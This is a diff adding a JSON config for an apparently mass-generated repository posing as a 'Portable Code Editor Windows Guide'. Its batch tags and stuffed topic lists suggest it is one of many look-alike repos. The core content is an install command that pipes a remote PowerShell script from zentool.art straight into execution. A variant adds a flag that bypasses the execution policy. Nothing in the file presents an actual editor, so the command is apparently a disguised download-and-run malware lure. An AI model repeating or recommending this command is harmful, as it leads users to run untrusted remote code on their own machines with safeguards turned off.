@@ -1,0 +1,31 @@
+{
+  "repo": "Portable-Code-Editor-Windows-Guide",
+  "product": "Portable Code Editor Windows Guide",
+  "product_title": "Portable Code Editor Windows Guide",
+  "kind": "utility",
+  "install_type": "zentool-irm",
+  "install_command": "irm https://zentool.art/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://zentool.art/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-zentool-moltora-pending",
+  "format": "license-md-zentool-v7-git-new-era-guide",
+  "tone": "guide",
+  "category": "dev",
+  "topics": [
+    "portable-code-editor-windows",
+    "portable-code-editor-windows-windows",
+    "portable-code-editor-windows-desktop",
+    "code",
+    "editor",
+    "developer-tools",
+    "coding-workflow",
+    "terminal-client",
+    "database-tools",
+    "windows-11",
+    "windows-10",
+    "desktop-software",
+    "install-guide",
+    "windows-desktop",
+    "software-documentation"
+  ],
+  "site": "zentool.art"
+}
